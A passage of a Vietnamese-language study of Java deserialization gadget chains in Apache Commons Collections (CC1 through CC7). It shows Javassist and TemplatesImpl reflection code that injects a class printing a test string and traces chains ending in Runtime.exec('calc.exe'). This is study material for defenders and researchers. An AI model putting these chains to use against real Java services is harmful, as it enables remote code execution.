        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass EvilClass = pool.makeClass("Evil");

        EvilClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        String cmd = "System.out.println(\"aaaaaaaaaaaaaaa\");";
        CtConstructor constructor = EvilClass.makeClassInitializer();
        constructor.insertBefore(cmd);
        EvilClass.writeFile("./");

        byte[] bytes = EvilClass.toBytecode();

        TemplatesImpl template = new TemplatesImpl();

        Class temp = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = temp.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(template,"11111");

        Field _class = temp.getDeclaredField("_class");
        _class.setAccessible(true);
        _class.set(template,null);

        Field _bytecodes = temp.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(template,new byte[][]{bytes});

        Field _tfactory = temp.getDeclaredField("_tfactory");
        _tfactory.setAccessible(true);
        _tfactory.set(template,new TransformerFactoryImpl());

        template.newTransformer();
    }
}
```

Về cơ bản thì đoạn mã này có công dụng là xác định đường dẫn của classpath như ta nói ở trên -> để thêm class Evil vào đường dẫn này -> và class evil sẽ có nội dung là in ra dòng chữ aaaaaaa -> tiếp theo sẽ khởi tạo một object từ class `TemplatesImpl` -> sau đó tải class TemplatesImpl ở thời điểm runtime để lợi dùng reflect api có thể truy vấn đến các method, biến của class này -> do đó ta sẽ truy cập đến các trường, biến private trong class này các biến mà ta đề cập ở trên để có thể đến được các gadget là _name, _class, _bytecodes, _tfactory do những biến này đề là private cho nên phải dùng setAccessible(true) để có thể thay đổi giá trị của chúng -> sau đó gọi newTransformer để access đến getTransletInstance để có thể kích hoạt gadget chain

![image](https://hackmd.io/_uploads/H1SU9HXp0.png)

-> bây giờ ta sẽ đi vào cụ thể gadget chain của cc2

*Đây là full chain của cc2:

``` java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
    PriorityQueue.heapify()
        PriorityQueue.siftDown()
            PriorityQueue.siftDownUsingComparator()
                TransformingComparator.compare()
                    InvokerTransformer.transform()
                        Method.invoke()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.getTransletInstance()
                                TemplatesImpl.defineTransletClasses()
                                    TransletClassLoader.defineClass()
                                newInstance()
                                    Runtime.getRuntime().exec("calc.exe")
```

Về cơ bản thì nó sẽ đi qua các method mà ta dùng ở trên

``` java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.PriorityQueue;

public class Main {
    public Main() {
    }

    public static void main(String[] args) {
        String filename = "src/cc2.bin";
        System.out.println("Reading file: " + filename);

        try {
            // Đọc dữ liệu từ file cc2.bin
            FileInputStream fileIn = new FileInputStream(filename);
            ObjectInputStream in = new ObjectInputStream(fileIn);
            Object obj = in.readObject();
            in.close();
            fileIn.close();
            System.out.println("Deserialized object: " + obj.toString());
        } catch (ClassNotFoundException | IOException e) {
            e.printStackTrace();
        }
    }
}

```

Ta sẽ dùng hàm main cơ bản để đọc file bin từ payload được gen thay vì base64 như các trường hợp trên do 1 số bản cũ không hỗ trợ java.lang.utils cho base64 nên hơi bất tiện

cc2.bin là payload được đọc vào -> tiến hành debug để đi vào gadget đầu tiên là `ObjectInputStream.readObject()` nó nằm ở trong hàm main của ta luôn `Object obj = in.readObject();`


![image](https://hackmd.io/_uploads/H1DJW-GTC.png)

Gía trị của enableOverride là false cho nên ta sẽ nhảy đến câu lệnh tiếp theo sau if.

![image](https://hackmd.io/_uploads/Hyt-GWMp0.png)

passHandle có giá trị là 1 và outerHandler được gán bằng nó -> đi vào khối lệnh try catch

try catch bắt lỗi cuối cùng gán:

```
passHandle = outerHandle;
            if (closed && depth == 0) {
                clear();
            }
```
và gọi clear() -> quay trở lại khối lệnh try lúc này passHandle có giá trị là 2

![image](https://hackmd.io/_uploads/ByEmnWfTA.png)


handles được khởi tạo từ class HandleTable

  ``handles = new HandleTable(10);``



Về cơ bản thì method này sẽ nhận đầu vào của ta sau đó được deserialize thì nó sẽ đi trace tất cả các class trong lib của java

ở đây ta thấy payload có dùng source vào là:

![image](https://hackmd.io/_uploads/HJVw6SXpC.png)


Vậy bắt đầu sẽ đi vào class `PriorityQueue` sau đó method readObject tại đây sẽ được gọi

![image](https://hackmd.io/_uploads/Sk0eCBmaA.png)

Nó sẽ tạo một queue sau đó cuối dùng gọi method heapify() 

![image](https://hackmd.io/_uploads/H1T8Cr7aR.png)


ở đây sẽ duyệt 1 vòng for ngược lại mảng queue sau đó gọi method `siftDown` cho từng loop với args là từng phần tử queue.

![image](https://hackmd.io/_uploads/BJ6UJLXTR.png)

Quan sát siftDown sẽ kiểm tra comparator nếu bằng null sẽ đi vào else -> ta sẽ xem 2 source ở đây để tìm gadget tiếp theo

![image](https://hackmd.io/_uploads/BJyAkUX60.png)

 đây sẽ là method tiếp theo nhảy vào tức comparator sẽ khác null nó sẽ gọi `comparator.compare` 
 
![image](https://hackmd.io/_uploads/SkUNxUQaA.png)

loop đầu right bằng size = 2 nên sẽ chạy vào `comparator.compare` ở dưới

![image](https://hackmd.io/_uploads/r1SKl8Q6R.png)

tạo đây sẽ có 2 lần gọi transform với 2 object 


cuối cùng sẽ gọi compare

![image](https://hackmd.io/_uploads/SyHRWI7T0.png)

để ý 2 method `transform` này có nguồn từ `InvokerTransformer`

![image](https://hackmd.io/_uploads/HJFKGImT0.png)

Đây cũng là sink lead to RCE mà ta đã nói đến ở bài trước sẽ dùng invoke để gọi method mã ta access đến với tham số

public synchronized javax.xml.transform.Transformer com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer() throws javax.xml.transform.TransformerConfigurationException

Đây là method sau khi được khởi tạo là một method là newTransformer từ class TemplatesImpl ta cũng đã phân tích ở trên sau khi set lại các giá trị private từ nó -> gọi đến `TemplatesImpl.getTransletInstance()`
-> access đến method `TemplatesImpl.defineTransletClasses()`

TemplatesImpl.defineTransletClasses()
                                    TransletClassLoader.defineClass()
                                newInstance()
                                    Runtime.getRuntime().exec("calc.exe")
                                    
                                    
Cuối cùng sẽ defineClass này:

![image](https://hackmd.io/_uploads/ryRBcUXaC.png)

bytecodes là một mảng byte được gen bới Javassist  -> khởi tạo một instane qua `getTransletInstance` tại ` AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();`

![image](https://hackmd.io/_uploads/HyGbhI7aA.png)

Tại đây có 2 class mới được khởi tạo:

![image](https://hackmd.io/_uploads/rJ4VhUmpC.png)

![image](https://hackmd.io/_uploads/r1qI2UmaC.png)

Và ClassLoader sẽ gọi đến class đó và calc sẽ được pop up

2 lớp trên chỉ tồn tại trong JVM:

Do lớp này được tạo tại runtime và không ghi ra file, nó chỉ tồn tại trong bộ nhớ heap của JVM không giống như ví dụ ta làm.

Ví dụ về reflect api trong trường hợp:

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Method;

public class RCEExample {
    public static void main(String[] args) throws Exception {
        // Giả lập đối tượng TemplatesImpl đã bị chèn mã XSLT độc hại
        TemplatesImpl templates = new TemplatesImpl();
        
        // Reflection gọi phương thức nào đó có tham số (giả sử có)
        Method method = TemplatesImpl.class.getDeclaredMethod("someMethodWithArgs", String.class, int.class);
        method.setAccessible(true);

        // Thực thi với tham số
        method.invoke(templates, "arg1", 123);  // Truyền vào tham số giả định
    }
}
```

## common colecttion 1



``` java
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
```


ở đây phần sink sẽ tương tự với CC5 nên ta sẽ không nói đoạn sau nữa bắt đầu đi vào phân tích source:

Đầu tiên vì class `AnnotationInvocationHandler` được sử dụng cho nên khi desesialize sẽ gọi đến method readObject của nó ta có thể thấy nó trong backtrace

![image](https://hackmd.io/_uploads/S1SexVN6A.png)


![image](https://hackmd.io/_uploads/BypVeN4aR.png)
 Sau khi vượt qua khối lệnh try catch thì sẽ khởi tạo một object var3 từ var2 
 
 ![image](https://hackmd.io/_uploads/BJQ5lVV6A.png)

Sau đó sẽ khởi tạo var4 qua method `.entrySet()` của class Map

![image](https://hackmd.io/_uploads/SJbEWEE60.png)
 Nó `Iterator var3 = this.memberValues.entrySet().iterator();` được khởi tạo như sau -> nó gọi entrySet của thằng memberValues là class của LazyMap
 
 -> lúc này nó được coi như là 1 proxy gọi ngược trở lại method invoke
 
 ``` java
 public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else if (var5.length != 0) {
            throw new AssertionError("Too many parameters for an annotation method");
        } else {
            switch (var4) {
                case "toString":
                    return this.toStringImpl();
                case "hashCode":
                    return this.hashCodeImpl();
                case "annotationType":
                    return this.type;
                default:
                    Object var6 = this.memberValues.get(var4);
                    if (var6 == null) {
                        throw new IncompleteAnnotationException(this.type, var4);
                    } else if (var6 instanceof ExceptionProxy) {
                        throw ((ExceptionProxy)var6).generateException();
                    } else {
                        if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                            var6 = this.cloneArray(var6);
                        }

                        return var6;
                    }
            }
        }
    }
```
 
``` java
 Object var6 = this.memberValues.get(var4); sẽ gọi đến get của LazyMap

public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```   

Cái chain này có thể bạn thấy quen nếu đã đọc từ đầu bài này nó là gadget của CC5 và sinh của nó cũng y hệt nên các bạn từ đọc lại trên để tìm hiểu nhé.


## common colection 3


``` java
Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
                               ConstantTransformer.transform()
                                  InvokerTransformer.transform()
                                    Method.invoke()
                                     Class.getMethod()
                                        InvokerTransformer.transform()
                                           Method.invoke()
                                              Runtime.getRuntime()
                                                  InvokerTransformer.transform()
                                                      Method.invoke()
                                                         Runtime.exec()
                                 
```

Full chain của collection này nó lấy phần source và phần gadget của cc1 và phần sink của cc5 nên ta sẽ không phân tích lại nữa



## common colection 6


``` java
Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

```

ở đây cc6 giống cc1 nhưng chỉ đổi phần sinh và phần 1 của gadget

## common colection 7


``` java
Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
```

## common colection 4

``` java
/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
```
